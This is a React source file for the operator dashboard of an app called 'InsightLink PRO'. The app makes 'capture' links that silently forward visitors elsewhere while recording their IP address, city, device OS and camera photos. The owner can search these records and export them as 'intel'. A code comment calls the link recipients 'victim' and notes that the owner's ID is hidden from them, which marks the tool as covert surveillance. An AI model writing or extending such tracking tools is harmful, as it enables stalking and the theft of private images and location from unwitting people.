
import React, { useState, useEffect, useMemo } from 'react';
import { Plus, Link as LinkIcon, Trash2, Shield, Camera, MapPin, Battery, Cpu, Copy, Check, RefreshCw, Globe, Wifi, Search, Download, Lock } from 'lucide-react';
import { LinkConfig, CaptureReport } from '../types';
import ReportDetail from './ReportDetail';

const Dashboard: React.FC = () => {
  const [ownerId] = useState(() => {
    let id = localStorage.getItem('il_owner_id');
    if (!id) {
      id = 'OWNER-' + Math.random().toString(36).substring(2, 15).toUpperCase();
      localStorage.setItem('il_owner_id', id);
    }
    return id;
  });

  const [links, setLinks] = useState<LinkConfig[]>([]);
  const [reports, setReports] = useState<CaptureReport[]>([]);
  const [redirectUrl, setRedirectUrl] = useState('');
  const [linkName, setLinkName] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [selectedReport, setSelectedReport] = useState<CaptureReport | null>(null);
  const [isSyncing, setIsSyncing] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');

  useEffect(() => {
    const savedLinks = localStorage.getItem('il_links');
    if (savedLinks) setLinks(JSON.parse(savedLinks));
    fetchReports();
    const interval = setInterval(fetchReports, 10000); 
    return () => clearInterval(interval);
  }, []);

  const fetchReports = async () => {
    setIsSyncing(true);
    try {
      const res = await fetch(`/api/all-reports?ownerId=${ownerId}`);
      if (res.ok) {
        const data = await res.json();
        setReports(data);
      }
    } catch (err) {
      console.error('Privacy Link: Sync error.');
    } finally {
      setTimeout(() => setIsSyncing(false), 800);
    }
  };

  const createLink = async () => {
    if (!redirectUrl) return;
    const cleanRedirect = redirectUrl.startsWith('http') ? redirectUrl : `https://${redirectUrl}`;
    const newLink: LinkConfig = {
      id: Math.random().toString(36).substring(2, 9),
      ownerId: ownerId,
      name: linkName || 'NODE-' + (links.length + 1).toString().padStart(2, '0'),
      redirectUrl: cleanRedirect,
      createdAt: new Date().toISOString(),
    };

    // Register on server for secure routing
    try {
      await fetch('/api/register-link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newLink)
      });
      
      const updatedLinks = [newLink, ...links];
      setLinks(updatedLinks);
      localStorage.setItem('il_links', JSON.stringify(updatedLinks));
      setRedirectUrl('');
      setLinkName('');
    } catch (e) {
      alert("Registration failed. Data siloing may be compromised.");
    }
  };

  const deleteLink = (id: string) => {
    if (!confirm('Decommission this Node?')) return;
    const updated = links.filter(l => l.id !== id);
    setLinks(updated);
    localStorage.setItem('il_links', JSON.stringify(updated));
  };

  const copyLink = (id: string) => {
    // Shared URL is now clean: ownerId is HIDDEN from victim
    const url = `${window.location.origin}/#/capture/${id}`;
    navigator.clipboard.writeText(url);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // Open the report detail view and stop propagation to prevent multiple triggers
  const openReport = (e: React.MouseEvent, report: CaptureReport) => {
    e.stopPropagation();
    setSelectedReport(report);
  };

  const downloadData = () => {
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(reports, null, 2));
    const downloadAnchorNode = document.createElement('a');
    downloadAnchorNode.setAttribute("href", dataStr);
    downloadAnchorNode.setAttribute("download", `intel_silo_${ownerId}.json`);
    document.body.appendChild(downloadAnchorNode);
    downloadAnchorNode.click();
    downloadAnchorNode.remove();
  };

  const filteredReports = useMemo(() => {
    return reports.filter(r => {
      const search = searchQuery.toLowerCase();
      return (
        r.location.ip?.toLowerCase().includes(search) ||
        r.device.os.toLowerCase().includes(search)
      );
    });
  }, [reports, searchQuery]);

  const stats = useMemo(() => ({
    total: reports.length,
    activeNodes: links.length,
    today: reports.filter(r => new Date(r.timestamp).toDateString() === new Date().toDateString()).length,
    uniqueIps: new Set(reports.map(r => r.location.ip)).size
  }), [reports, links]);

  return (
    <div className="max-w-7xl mx-auto px-4 py-8 md:py-12 animate-pop">
      <div className="flex flex-col lg:flex-row lg:items-center justify-between mb-10 gap-6">
        <div>
          <h1 className="text-3xl md:text-5xl font-black text-ink tracking-tighter flex items-center gap-4 italic uppercase">
            <div className="bg-brand-accent border-3 border-ink p-3 rotate-3 shadow-comic shrink-0">
              <Shield className="text-white" size={32} />
            </div>
            InsightLink <span className="text-brand-accent">PRO</span>
          </h1>
          <div className="flex items-center gap-4 mt-2">
            <p className="text-ink/60 font-bold flex items-center gap-2 text-sm uppercase tracking-widest">
              <Wifi size={16} className="text-brand-accent animate-pulse" /> 
              Siloed Intelligence
            </p>
            <div className="h-4 w-px bg-ink/10" />
            <div className="flex items-center gap-2 bg-green-50 border border-green-200 px-3 py-1 rounded-full">
               <Lock size={12} className="text-green-600" />
               <span className="text-[10px] font-black text-green-700 uppercase">Only You See Your Data</span>
            </div>
          </div>
        </div>
        
        <div className="flex flex-wrap items-center gap-3">
          <button onClick={downloadData} disabled={reports.length === 0} className="comic-button bg-white px-5 py-3 border-3 border-ink flex items-center gap-2 font-black text-sm uppercase italic disabled:opacity-30">
            <Download size={18} /> Export Intel
          </button>
          <button onClick={fetchReports} className={`comic-button bg-pastel-yellow px-5 py-3 border-3 border-ink flex items-center gap-2 font-black text-sm uppercase italic transition-all ${isSyncing ? 'translate-y-1 shadow-none' : ''}`}>
            <RefreshCw size={18} className={isSyncing ? 'animate-spin' : ''} />
            Sync Feed
          </button>
        </div>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10">
        {[
          { label: 'My Total Captures', val: stats.total, icon: Camera, color: 'bg-pastel-blue' },
          { label: 'Active My Links', val: stats.activeNodes, icon: LinkIcon, color: 'bg-pastel-pink' },
          { label: 'Sessions (24h)', val: stats.today, icon: Wifi, color: 'bg-pastel-green' },
          { label: 'Unique IPs', val: stats.uniqueIps, icon: Globe, color: 'bg-pastel-yellow' }
        ].map((s, i) => (
          <div key={i} className={`comic-card p-4 md:p-6 ${s.color} flex flex-col items-center text-center`}>
            <s.icon size={20} className="mb-2 text-ink/40" />
            <span className="text-2xl md:text-3xl font-black text-ink">{s.val}</span>
            <span className="text-[10px] font-black uppercase tracking-widest text-ink/40 mt-1">{s.label}</span>
          </div>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-10">
        <div className="lg:col-span-4 space-y-8">
          <div className="comic-card p-6 bg-white">
            <h2 className="text-xl font-black text-ink mb-6 flex items-center gap-3 italic uppercase">
              <Plus size={24} className="bg-brand-accent text-white border-2 border-ink p-1 rounded-md" />
              Secure Deploy
            </h2>
            <div className="space-y-5">
              <input type="text" placeholder="Node Alias (e.g. ALPHA-1)" className="w-full px-4 py-3 border-3 border-ink bg-paper outline-none font-bold placeholder:text-ink/20" value={linkName} onChange={(e) => setLinkName(e.target.value)} />
              <input type="text" placeholder="Final Redirect URL" className="w-full px-4 py-3 border-3 border-ink bg-paper outline-none font-bold placeholder:text-ink/20" value={redirectUrl} onChange={(e) => setRedirectUrl(e.target.value)} />
              <button onClick={createLink} className="w-full bg-ink text-white font-black py-4 border-3 border-ink shadow-comic hover:bg-brand-accent transition-colors uppercase italic tracking-tighter">
                Deploy Node
              </button>
            </div>
          </div>

          <div className="comic-card p-6 bg-white">
            <h2 className="text-xl font-black text-ink mb-6 flex items-center gap-3 italic uppercase">
              <Wifi size={24} className="bg-pastel-pink border-2 border-ink p-1 rounded-md" />
              My Private Links
            </h2>
            <div className="space-y-4 max-h-[350px] overflow-y-auto pr-2 custom-scrollbar">
              {links.map((link) => (
                <div key={link.id} className="p-4 bg-paper border-2 border-ink hover:bg-white transition-colors">
                  <div className="flex items-center justify-between mb-2">
                    <span className="font-black text-ink text-xs truncate uppercase italic">{link.name}</span>
                    <button onClick={() => deleteLink(link.id)} className="text-ink/20 hover:text-red-500">
                      <Trash2 size={16} />
                    </button>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="bg-white border-2 border-ink text-[10px] font-mono p-2 flex-1 truncate text-ink/40">
                      capture/{link.id}
                    </div>
                    <button onClick={() => copyLink(link.id)} className={`p-2 border-2 border-ink ${copiedId === link.id ? 'bg-green-400' : 'bg-white'}`}>
                      {copiedId === link.id ? <Check size={16} /> : <Copy size={16} />}
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="lg:col-span-8">
          <div className="comic-card h-full bg-white flex flex-col min-h-[600px]">
            <div className="px-6 py-5 border-b-3 border-ink flex items-center justify-between bg-paper">
              <h2 className="text-2xl font-black text-ink italic uppercase tracking-tighter">Private Feed</h2>
              <div className="relative">
                <Search size={18} className="absolute left-3 top-1/2 -translate-y-1/2 text-ink/30" />
                <input type="text" placeholder="Search my intel..." className="pl-10 pr-4 py-2 bg-white border-3 border-ink text-sm font-bold outline-none w-64" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} />
              </div>
            </div>

            <div className="flex-1 overflow-y-auto custom-scrollbar">
              {filteredReports.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-32 text-center opacity-30 italic font-bold">
                  Siloed database empty.
                </div>
              ) : (
                <div className="divide-y-3 divide-ink">
                  {filteredReports.map((report, idx) => (
                    <div key={idx} className="p-6 md:p-8 hover:bg-brand-accent/5 transition-all cursor-pointer group border-l-[12px] border-transparent hover:border-brand-accent" onClick={(e) => openReport(e, report)}>
                      <div className="flex flex-col md:flex-row items-center justify-between gap-6">
                        <div className="flex items-center gap-6">
                          <div className="w-16 h-16 bg-paper border-3 border-ink shadow-comic-sm overflow-hidden flex items-center justify-center">
                            {report.photos?.[0] ? <img src={report.photos[0]} className="w-full h-full object-cover" /> : <Camera size={20} className="text-ink/10" />}
                          </div>
                          <div>
                            <h3 className="font-black text-xl text-ink uppercase">{report.location.ip || 'ANON-IP'}</h3>
                            <div className="flex gap-4 text-xs font-bold text-ink/50 uppercase italic">
                              <span className="flex items-center gap-1"><MapPin size={12}/> {report.location.city}</span>
                              <span className="flex items-center gap-1"><Cpu size={12}/> {report.device.os}</span>
                            </div>
                          </div>
                        </div>
                        <button onClick={(e) => openReport(e, report)} className="bg-white hover:bg-ink hover:text-white border-3 border-ink px-6 py-2 font-black uppercase text-xs italic">
                          View Case
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
      {selectedReport && <ReportDetail report={selectedReport} onClose={() => setSelectedReport(null)} />}
    </div>
  );
};

export default Dashboard;
